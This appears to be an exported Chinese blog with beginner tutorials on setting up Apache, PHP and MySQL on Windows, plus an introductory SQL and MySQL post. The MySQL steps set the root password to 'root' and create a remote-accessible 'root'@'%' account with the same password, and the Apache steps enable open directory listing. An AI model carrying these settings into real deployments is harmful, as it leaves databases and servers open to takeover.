<h2 id="IP的概念"><a href="#IP的概念" class="headerlink" title="IP的概念"></a>IP的概念</h2><p>IP：Internet Protocol，网络之间互联协议。网络之间互连的协议也就是为计算机网络相互连接进行通信而设计的协议。在因特网中，它是能使连接到网上的所有计算机网络实现相互通信的一套规则，规定了计算机在因特网上进行通信时应当遵守的规则。任何厂家生产的计算机系统，只要遵守IP协议就可以与因特网互连互通。<strong>IP地址具有唯一性。</strong>（每台电脑（如果只有一个网卡的话）都有一个唯一的IP地址）</p>
<h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><p>域名（Domain Name），是由一串用点分隔的名字组成（<a href="http://www.baidu.com)的internet上某一台计算机或计算机组的名称,用于在数据传输时标识计算机的电子方位(有时也指地理位置,地理上的域名,指代有行政自主权的一个地方区域).**域名是一个ip地址上有“面具”/">www.baidu.com）的Internet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位（有时也指地理位置，地理上的域名，指代有行政自主权的一个地方区域）。**域名是一个IP地址上有“面具”</a>** 。一个域名的目的是便于记忆和沟通的一组服务器的地址（网站，电子邮件，FTP等）。域名作为力所能及难忘的互联网参与者的名称。</p>
<p>特殊IP：127.0.0.1，代表本机</p>
<p>特殊域名：localhost</p>
<h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>DNS（Domain Name System，域名系统），因特网上作为域名和IP地址相互映射的一个分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。通过主机名，最终得到该主机名对应的IP地址的过程叫做域名解析（或主机名解析）。</p>
<p>用户输入域名localhost =&gt; DNS（localhost 127.0.0.1）=&gt; 服务器电脑</p>
<h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><p>端口（Port），可以认为是设备与外界通讯交流的出口。端口可分为虚拟端口和物理端口，其中虚拟端口指计算机内部或交换机路由器内的端口，不可见。例如计算机中的80端口、21端口、23端口等。物理端口又称为接口，是可见端口，计算机背板的RJ45网口，交换机路由器集线器等RJ45端口。</p>
<p>用户输入域名localhost:端口 =&gt; DNS（localhost 127.0.0.1）=&gt; 服务器电脑 =&gt; 软件（服务）</p>
<h1 id="网站访问流程"><a href="#网站访问流程" class="headerlink" title="网站访问流程"></a>网站访问流程</h1><p>浏览器发起访问–》DNS解析域名–》服务器电脑–》服务软件</p>
<h2 id="静态网站"><a href="#静态网站" class="headerlink" title="静态网站"></a>静态网站</h2><p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220129222735907.png" alt="image-20220129222735907"></p>
<h2 id="动态网站"><a href="#动态网站" class="headerlink" title="动态网站"></a>动态网站</h2><p>动态网站访问流程与静态差不多，但是会多出几个内容：服务器端解析、数据库</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220129223402559.png" alt="image-20220129223402559"></p>
<h1 id="Apache的安装和使用"><a href="#Apache的安装和使用" class="headerlink" title="Apache的安装和使用"></a>Apache的安装和使用</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220129230152301.png" alt="image-20220129230152301"></p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220129230235487.png" alt="image-20220129230235487"></p>
<h2 id="目录介绍"><a href="#目录介绍" class="headerlink" title="目录介绍"></a>目录介绍</h2><p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220129230320686.png" alt="image-20220129230320686"></p>
<h2 id="httpd指令的使用"><a href="#httpd指令的使用" class="headerlink" title="httpd指令的使用"></a>httpd指令的使用</h2><p>因为没有配置环境变量，所以httpd只能在apache的bin目录下使用</p>
<p>这里介绍了两个指令</p>
<p><code>httpd -M</code>查看使用的模块</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220129231247378.png" alt="image-20220129231247378"></p>
<p><code>httpd -t</code>验证配置文件是否有效</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220129231310602.png" alt="image-20220129231310602"></p>
<h2 id="配置默认站点"><a href="#配置默认站点" class="headerlink" title="配置默认站点"></a>配置默认站点</h2><p>1.让Apache确定服务器上访问的位置：网站文件夹所在位置</p>
<p>conf文件夹中的Httpd.conf文件中的：DocumentRoot</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220129231630244.png" alt="image-20220129231630244"></p>
<p>2.方便用户使用名字访问对应的网站：给文件夹对应的取一个别名</p>
<p>conf文件夹中的Httpd.conf文件中的：ServerName</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220129231906230.png" alt="image-20220129231906230"></p>
<p>端口可以单独实现：httpd.conf：listen</p>
<p><strong>凡是涉及到Apache配置文件的修改，那么需要重启Apache才能生效</strong></p>
<p>3.实现DNS域名解析：通常默认站点都是本地DNS：hosts文件</p>
<p>查看是否能够访问</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220129232630161.png" alt="image-20220129232630161"></p>
<p>这里的内容可以在htdocs文件夹的index.html中修改</p>
<h1 id="安装PHP"><a href="#安装PHP" class="headerlink" title="安装PHP"></a>安装PHP</h1><p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130145350704.png" alt="image-20220130145350704"></p>
<p>解压后与apache文件夹放在一起</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130145522298.png" alt="image-20220130145522298"></p>
<h2 id="php目录介绍"><a href="#php目录介绍" class="headerlink" title="php目录介绍"></a>php目录介绍</h2><p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130150013564.png" alt="image-20220130150013564"></p>
<p>PHP.exe就是可以解析PHP代码转变成HTML代码从而让浏览器可以解析的。</p>
<p>通过CMD控制器进入到php.exe所在目录（没有配置php环境变量就要进文件夹）</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130150237621.png" alt="image-20220130150237621"></p>
<p>通过php.exe运行命令来指定要解析的PHP脚本就可以：php.exe -f PHP文件所在路径</p>
<p>首先要在PHP所在路径创建php文件，这里创建了index.php并写入了简单的echo代码</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130150654236.png" alt="image-20220130150654236"></p>
<h2 id="配置Apache加载PHP模块"><a href="#配置Apache加载PHP模块" class="headerlink" title="配置Apache加载PHP模块"></a>配置Apache加载PHP模块</h2><p>若不配置，php与apache不能产生联系，用浏览器访问php文件，仍然是代码</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130150933799.png" alt="image-20220130150933799"></p>
<p>1.Apache加载PHP模块：在Apache的主配置文件（httpd.conf）中加载对应的PHP提供的模块</p>
<p>在LoadModule最后面添加<code>LoadModule php5_module PHP所提供的模块链接所在路径</code></p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130151437174.png" alt="image-20220130151437174"></p>
<p>可以用在apache的bin目录下使用<code>httpd -t</code>和<code>httpd -M</code>来检验是否加载成功</p>
<p>然后重启apache</p>
<p>2.然后apache要分配工作给php</p>
<p>如果是PHP代码就交给PHP处理：文件后缀判断.php结尾肯定是PHP代码</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130152046731.png" alt="image-20220130152046731"></p>
<p>然后用在apache的bin目录下使用<code>httpd -t</code>和<code>httpd -M</code>来检验是否加载成功，并重启Apache</p>
<p>再访问刚刚访问的网址</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130152148617.png" alt="image-20220130152148617"></p>
<p>ok了，然后还有第三步</p>
<p>3.将PHP的配置文件加载到Apache配置文件中：共同生效</p>
<p>在Apache中指定PHP配置文件所在路径</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130152711629.png" alt="image-20220130152711629"></p>
<p>php.ini文件默认是不存在的，是以development和production格式存在，需要格式化</p>
<p>将development复制一份，并改后缀</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130152929533.png" alt="image-20220130152929533"></p>
<p>重启apache</p>
<p>说明：PHP的配置文件已经加入到Apache的配置项中，意味着php.ini的修改需要Apache重启才会生效。</p>
<h1 id="安装和使用MySQL"><a href="#安装和使用MySQL" class="headerlink" title="安装和使用MySQL"></a>安装和使用MySQL</h1><p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130153308455.png" alt="image-20220130153308455"></p>
<p>选择自定义</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130153406888.png" alt="image-20220130153406888"></p>
<p>修改路径</p>
<p>软件安装路径</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130153550707.png" alt="image-20220130153550707"></p>
<p>数据安装路径</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130153724063.png" alt="image-20220130153724063"></p>
<p>然后无脑下一步</p>
<p>进入配置页面</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130153947795.png" alt="image-20220130153947795"></p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130154128619.png" alt="image-20220130154128619"></p>
<p>选第一个</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130154322675.png" alt="image-20220130154322675"></p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130154455181.png" alt="image-20220130154455181"></p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130154554371.png" alt="image-20220130154554371"></p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130155033879.png" alt="image-20220130155033879"></p>
<p>等待安装完成</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130160045517.png" alt="image-20220130160045517"></p>
<h2 id="目录结构说明"><a href="#目录结构说明" class="headerlink" title="目录结构说明"></a>目录结构说明</h2><p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130160153996.png" alt="image-20220130160153996"></p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130161145616.png" alt="image-20220130161145616"></p>
<p>软件设计结构：C/S和B/S</p>
<p>C/S：Client客户端/Server服务端，用户需要安装客户端产品才能访问服务器，而且只能访问一种软件（当前自己）</p>
<p>B/S：Browser浏览器/Server服务端，用户只需要安装浏览器，就可以访问所有的服务器（B/S架构服务）</p>
<h2 id="访问MySQL"><a href="#访问MySQL" class="headerlink" title="访问MySQL"></a>访问MySQL</h2><p>首先要打开mysql服务</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130161442154.png" alt="image-20220130161442154"></p>
<p>Mysql是一款C/S架构的软件，需要通过客户端来访问服务端（MySQL提示也提供了其他模式的访问：通过一些插件扩展来充当客户端）</p>
<p>启用MySQL客户端：mysql.exe，该软件本身可以通过CMD控制台运行</p>
<p>本身客户端：mysql.exe</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130161645785.png" alt="image-20220130161645785"></p>
<p>也可以直接通过cmd访问</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130162435116.png" alt="image-20220130162435116"></p>
<p>这是之前安装的那个mysql8，要连接我们现在安装的mysql5则要输入端口</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130162603446.png" alt="image-20220130162603446"></p>
<p>MySQL客户端访问服务端需要进行寻找匹配：连接认证</p>
<p>连接：IP和端口确认，如果是本地都可以省略</p>
<p>-h主机地址—-》-hlocalhost（可以是IP）</p>
<p>-P端口—》-P3306</p>
<p>认证：通过用户名和密码进入服务器</p>
<p>-u用户名—》-uroot，不可以省略（匿名用户除外）</p>
<p>-p密码—》-proot</p>
<h2 id="PHP加载MySQL"><a href="#PHP加载MySQL" class="headerlink" title="PHP加载MySQL"></a>PHP加载MySQL</h2><p>PHP本身不具备操作MySQL数据库的能力，需要借助PHP操作MySQL的扩展来实现。</p>
<p>1.PHP加载MySQL扩展：php.ini文件中</p>
<p>查找mysql并去掉前面的  ;  然后重启apache</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130182957868.png" alt="image-20220130182957868"></p>
<p>之后修改以前创建的index.php文件，查看php相关配置</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130183159581.png" alt="image-20220130183159581"></p>
<p>然后访问页面</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130183229980.png" alt="image-20220130183229980"></p>
<p>搜索mysql，发现并没有生效</p>
<p>2.PHP中所有的扩展都是在ext文件夹中，需要制定扩展所在路径：extension_dir</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130183734593.png" alt="image-20220130183734593"></p>
<p>然后重启apache</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130184006809.png" alt="image-20220130184006809"></p>
<h2 id="设定php系统时区"><a href="#设定php系统时区" class="headerlink" title="设定php系统时区"></a>设定php系统时区</h2><p>如果不设置会有警告</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130184151362.png" alt="image-20220130184151362"></p>
<p>通过php.ini中的timezone配置项来实现</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130184421102.png" alt="image-20220130184421102"></p>
<p>重启后生效</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130184443181.png" alt="image-20220130184443181"></p>
<h1 id="配置虚拟主机"><a href="#配置虚拟主机" class="headerlink" title="配置虚拟主机"></a>配置虚拟主机</h1><p>一台服务器很贵，如果只能部署一个网站，那么非常浪费。所以需要通过其他渠道来实现一台主机上部署多个网站。</p>
<h2 id="什么是虚拟主机"><a href="#什么是虚拟主机" class="headerlink" title="什么是虚拟主机"></a>什么是虚拟主机</h2><p>虚拟主机：Virtual machine，并不存在真实的主机，但是可以提供真实主机所实现的功能。</p>
<p>通俗的讲，虚拟主机就是将计算机中不同的文件夹进行不同的命名，然后可以实现让服务器（Apache）根据用户的需求从不同的文件夹（网站）中读取不同的内容。</p>
<h2 id="虚拟主机的分类"><a href="#虚拟主机的分类" class="headerlink" title="虚拟主机的分类"></a>虚拟主机的分类</h2><p>在Apache中，可以将虚拟主机划分成两类：</p>
<p>1、 基于IP的虚拟主机：一台电脑上有多个IP，每个IP对应一个网站</p>
<p>原理：电脑默认只有一个IP，因为通常只配有一个网卡；但是有的电脑（服务器居多）可以配置多个网卡，每个网卡可以绑定一个IP地址。</p>
<p>2、 基于域名的虚拟主机：一台电脑上只有一个IP，但是IP下可以制作多个网站，但是需要给每个网站不同的名字（虚拟主机名）</p>
<h1 id="搭建基于域名的虚拟主机"><a href="#搭建基于域名的虚拟主机" class="headerlink" title="搭建基于域名的虚拟主机"></a>搭建基于域名的虚拟主机</h1><p>在Apache中，虚拟主机的搭建有两种方式：</p>
<p>1.在主配置文件中搭建：需要手动开启虚拟主机（基于域名）</p>
<p>NameVirtualHost *:80</p>
<p>2.在专门的虚拟主机配置文件中配置</p>
<p>2.1在主配置文件中加载虚拟主机配置文件(httpd.conf)：虚拟主机配置文件已经开启了虚拟主机NameVirtualHost</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130190746631.png" alt="image-20220130190746631"></p>
<p>2.2虚拟主机从配置文件（extra/httpd-vhosts.conf）中配置虚拟主机</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130191051384.png" alt="image-20220130191051384"></p>
<p>①增加一个对应的站点文件夹位置：DocumentRoot</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130191323263.png" alt="image-20220130191323263"></p>
<p>②增加主机名字：文件夹的别名：ServerName</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130192600474.png" alt="image-20220130192600474"></p>
<p>③ 增加域名解析DNS：hosts</p>
<p>host文件地址：C:\Windows\System32\drivers\etc</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130192211393.png" alt="image-20220130192211393"></p>
<p>重启apache</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130192625049.png" alt="image-20220130192625049"></p>
<p>④需要给当前设定的站点（目录）访问权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Directory &#x27;D:/discuz&#x27;&gt;</span><br><span class="line">       	order deny,allow</span><br><span class="line">	deny from all</span><br><span class="line">	allow from all</span><br><span class="line">	&lt;/Directory&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130201434788.png" alt="image-20220130201434788"></p>
<p>然后随便在discuz里面添加一个html文件，之后访问</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130201632542.png" alt="image-20220130201632542"></p>
<p>成功</p>
<p>⑤配置访问列表：当访问是一个目录时候（没有指定具体要访问的文件）</p>
<p>Options Indexes [FollowSymLinks]，（中括号表示可有可无）如果访问目录，那么列表显示所有文件</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130203126391.png" alt="image-20220130203126391"></p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130203138613.png" alt="image-20220130203138613"></p>
<p>注意，此处不能有html文件，否则无法显示</p>
<p>⑥ 当用户访问指定目录不指定文件的时候，通常需要系统指定一个默认文件</p>
<p>DirectoryIndex 默认的文件列表，使用空格分离</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130203451919.png" alt="image-20220130203451919"></p>
<p>注意：如果说网站中整个网站根目录允许访问，但是其中还有其他文件夹不允许访问：可以增加多个Directory标签，针对不同的文件夹</p>
<p>例如，如果不想让访问上述的 新建文件夹 则可添加 DirectoryIndex index.php shl.txt</p>
<p>3.一旦启用虚拟主机配置文件，那么默认的主机地址localhost就不再生效，如果想要生效：为localhost增加单独的虚拟主机</p>
<p>若想不影响，则再添加一条virtualhost就行</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130204205483.png" alt="image-20220130204205483"></p>
<p>结果如下</p>
<p><img src="/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20220130204444679.png" alt="image-20220130204444679"></p>
<p>（本内容摘自B站黑马程序员，但略有所改动）</p>
]]></content>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL入门</title>
    <url>/2022/01/12/SQL%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1 id="计算机语言"><a href="#计算机语言" class="headerlink" title="计算机语言"></a>计算机语言</h1><ul>
<li><p>机器语言：例如10101010100011（二进制语言）</p>
</li>
<li><p>汇编语言：也是比较接近计算机底层，例如<img src="/2022/01/12/SQL%E5%85%A5%E9%97%A8/image-20220112122525180.png" alt="image-20220112122525180"></p>
</li>
<li><p>高级语言：例如C语言（更接近底层）、python、SQL等</p>
<span id="more"></span></li>
</ul>
<h1 id="SQL概述"><a href="#SQL概述" class="headerlink" title="SQL概述"></a>SQL概述</h1><p><strong>SQL</strong> (Structured Query Language:结构化查询语言) 是用于管理关系数据库管理系统（RDBMS）。 SQL 的范围包括数据插入、查询、更新和删除，数据库模式创建和修改，以及数据访问控制。</p>
<h2 id="SQL的特点"><a href="#SQL的特点" class="headerlink" title="SQL的特点"></a>SQL的特点</h2><ul>
<li>具有总和统一性，不同数据库所支持的SQL稍有不同</li>
<li>非过程化语言（不需要关心内部操作过程）</li>
<li>语言简洁，用户容易接受</li>
<li>以一种语言结构提供两种使用方式，例如SQL和python或java结合使用</li>
</ul>
<h2 id="SQL的语法特点"><a href="#SQL的语法特点" class="headerlink" title="SQL的语法特点"></a>SQL的语法特点</h2><ul>
<li>SQL对关键字的大小写不敏感，比如SELECT和select一样</li>
<li>SQL语句可以以单行或者多行书写，以分号结束</li>
<li>SQL注释分单行注释和多行注释，单行注释语法：<code>-- 单行注释</code>，注意–后面有空格；<code>#单行注释</code>，#后可加可不加空格。例如<code>select * from 库名;-- 单行注释</code>。多行注释和C++一样<code>/*  注释内容  */</code>。</li>
</ul>
<h1 id="数据库概述"><a href="#数据库概述" class="headerlink" title="数据库概述"></a>数据库概述</h1><p>数据库（DataBase）是“按照数据结构来组织、存储和管理数据的仓库”。是一个长期存储在计算机内的、有组织的、可共享的、统一管理的大量数据的集合。</p>
<p><strong>数据库应用系统是指基于数据库的应用软件</strong></p>
<h2 id="数据库管理系统"><a href="#数据库管理系统" class="headerlink" title="数据库管理系统"></a>数据库管理系统</h2><h3 id="关系型数据库（RDBMS）"><a href="#关系型数据库（RDBMS）" class="headerlink" title="关系型数据库（RDBMS）"></a>关系型数据库（RDBMS）</h3><ul>
<li>Oracle数据库（最挣钱体积庞大，几个Gb）</li>
<li>MySQL数据库（最流行中型数据库）</li>
<li>SQL server数据库（Window上最好的数据库）</li>
<li>PostgreSQL（功能最强大的开源数据库）</li>
<li>SQLite（最流行的嵌入式数据库，体积非常小几百kb）</li>
</ul>
<h3 id="非关系型数据库（NoSQL）"><a href="#非关系型数据库（NoSQL）" class="headerlink" title="非关系型数据库（NoSQL）"></a>非关系型数据库（NoSQL）</h3><ul>
<li>Redis（最好的缓存数据库）</li>
<li>MongoDB（最好的文档型数据库）</li>
<li>Elasticsearch（最好的搜索服务）</li>
<li>Cassandra（最好的列式数据库）</li>
<li>HBase（优秀的分布式、列式数据库）</li>
</ul>
<p><strong>两类数据库的区别在于，关系型数据库存储数据用一张张的表，而非关系型数据库有其自身的存储方式</strong></p>
<h2 id="SQL和数据库管理系统的关系"><a href="#SQL和数据库管理系统的关系" class="headerlink" title="SQL和数据库管理系统的关系"></a>SQL和数据库管理系统的关系</h2><ul>
<li>SQL是一种用于操作数据库的语言，SQL适用于所有的关系数据库。</li>
<li>MySQL、Oracle、SQLSever是一个数据库软件，这些数据库软件支持标准的SQL，也就是通过SQL可以使用这些软件，不过每一个数据库系统会在标准SQL的举出上扩展自己的SQL语法</li>
<li>大部分NoSQL数据库有自己的操作语言，对SQL支持并不好</li>
</ul>
<h2 id="关系型数据库的组成"><a href="#关系型数据库的组成" class="headerlink" title="关系型数据库的组成"></a>关系型数据库的组成</h2><p>数据库管理系统（DBMS）主要由数据库（Database）和表（table）组成，一个系统可以有很多数据库，每个数据库可以有很多表。</p>
<h1 id="MySQL简介"><a href="#MySQL简介" class="headerlink" title="MySQL简介"></a>MySQL简介</h1><ul>
<li>MySQL如今归Oracle管，并有社区版和企业版</li>
<li>MySQL使用标准化的SQL语言</li>
</ul>
<h2 id="MySQL的特点"><a href="#MySQL的特点" class="headerlink" title="MySQL的特点"></a>MySQL的特点</h2><ol>
<li>MySQL的数据库是用C和C++语言编写的，以保证源码的可移植性</li>
<li>支持多个操作系统，例如：Windows、Linux、Mac OS等等</li>
<li>支持多线程，可以充分利用CPU资源</li>
<li>为多种编程语言提供API，包括C语言、Java、PHP、Python语言等</li>
<li>MySQL优化了SQL算法，有效的提高了查询速度</li>
<li>MySQL开放源代码，且无版权制约，自主性强，使用成本低</li>
<li>MySQL历史悠久，社区及用户非常活跃，遇到问题，可以很快获得帮助</li>
</ol>
<h2 id="MySQL的版本"><a href="#MySQL的版本" class="headerlink" title="MySQL的版本"></a>MySQL的版本</h2><p>针对不同用户，MySQL分为两种不同的版本：</p>
<p><strong>MySQL Community Server</strong></p>
<p>社区版本，免费，但是MySQL不提供官方的技术支持</p>
<p><strong>MySQL Enterprise Edition</strong></p>
<p>商业版，该版本是收费的，可以试用30天，官方提供技术支持</p>
<p><strong>MySQL Cluster</strong></p>
<p>集群版，开源免费，可将几个MySQL Server封装成一个Server</p>
<p><strong>MySQL Cluster CGE</strong></p>
<p>高级集群版，需要付费</p>
<p><strong>MySQL Workbench （GUI TOOL）</strong></p>
<p>一款专门为MySQL设计的ER/数据库建模工具，MySQL Workbench又分为两个版本，分别是社区版（MySQL Workbench OSS）、商用版（MySQL Workbench SE）</p>
<h2 id="MySQL的版本命名"><a href="#MySQL的版本命名" class="headerlink" title="MySQL的版本命名"></a>MySQL的版本命名</h2><p>MySQL的命名机制使用三个数字和一个后缀组成的版本号，例如，mysql-8.0.26的版本号这样解释：</p>
<p>第一个数字（8）是主版本号，描述了文件格式，所有版本5的发行都有相同的文件格式。</p>
<p>第二个数字（0）是发行级别，主版本号和发行级别组合到一块便构成了发行序列号。</p>
<p>第三个数字（26）是在此发行系列的版本号，随每个新发行版本递增</p>
<h1 id="MySQL的安装"><a href="#MySQL的安装" class="headerlink" title="MySQL的安装"></a>MySQL的安装</h1><h2 id="压缩包安装"><a href="#压缩包安装" class="headerlink" title="压缩包安装"></a>压缩包安装</h2><p>去<a href="https://dev.mysql.com/downloads/mysql/">官网下载zip</a>然后解压进行配置</p>
<p><img src="/2022/01/12/SQL%E5%85%A5%E9%97%A8/image-20220112153020029.png" alt="image-20220112153020029"></p>
<p>解压后新建my. ini文件,并编辑</p>
<p><img src="/2022/01/12/SQL%E5%85%A5%E9%97%A8/image-20220112160645372.png" alt="image-20220112160645372"></p>
<p>若没有新建文件的权力，修改一下内容</p>
<p><img src="/2022/01/12/SQL%E5%85%A5%E9%97%A8/image-20220112160750113.png" alt="image-20220112160750113"></p>
<p>然后配置环境变量（<strong>若不配置，则cmd无法识别mysql指令</strong>）</p>
<p><img src="/2022/01/12/SQL%E5%85%A5%E9%97%A8/image-20220112161003464.png" alt="image-20220112161003464"></p>
<p>然后在Path中添加如下内容</p>
<p><img src="/2022/01/12/SQL%E5%85%A5%E9%97%A8/image-20220112161441314.png" alt="image-20220112161441314"></p>
<p>配置好后，进入cmd（管理员模式）并打开bin文件如图</p>
<p><img src="/2022/01/12/SQL%E5%85%A5%E9%97%A8/image-20220112162133149.png" alt="image-20220112162133149"></p>
<p>然后对mysql进行初始化，记住初始化密码，下面登录要用</p>
<p><code>mysqld --initialize --user=mysql --console</code></p>
<p><img src="/2022/01/12/SQL%E5%85%A5%E9%97%A8/image-20220112221537146.png" alt="image-20220112221537146"></p>
<p>安装mysql服务</p>
<p><code>mysqld --install</code></p>
<p>启动mysql服务</p>
<p><code>net start mysql</code></p>
<p>登录mysql</p>
<p><code>mysql -uroot -p</code></p>
<p><img src="/2022/01/12/SQL%E5%85%A5%E9%97%A8/image-20220112223115990.png" alt="image-20220112223115990"></p>
<p>修改root用户密码为root</p>
<p><code>ALTER USER&#39;root&#39;@&#39;localhost&#39; IDENTIFIED WITH mysql_native_password BY &#39;root&#39;;</code></p>
<p>修改root用户权限</p>
<p><code>create user &#39;root&#39;@&#39;%&#39; IDENTIFIED WITH mysql_native_password BY &#39;root&#39;;</code></p>
<p><img src="/2022/01/12/SQL%E5%85%A5%E9%97%A8/image-20220112223244690.png" alt="image-20220112223244690"></p>
<p>退出登录用quit</p>
<h2 id="程序安装"><a href="#程序安装" class="headerlink" title="程序安装"></a>程序安装</h2><p>去<a href="https://dev.mysql.com/downloads/windows/installer/8.0.html">官网下载程序</a>然后安装</p>
<p><img src="/2022/01/12/SQL%E5%85%A5%E9%97%A8/image-20220112154249700.png" alt="image-20220112154249700"></p>
<p>这种方法比较上一种，少了配置my.ini文件和初始化的步骤，其余差不多，但需要注意的是配置环境变量时，MySQL的安装路径</p>
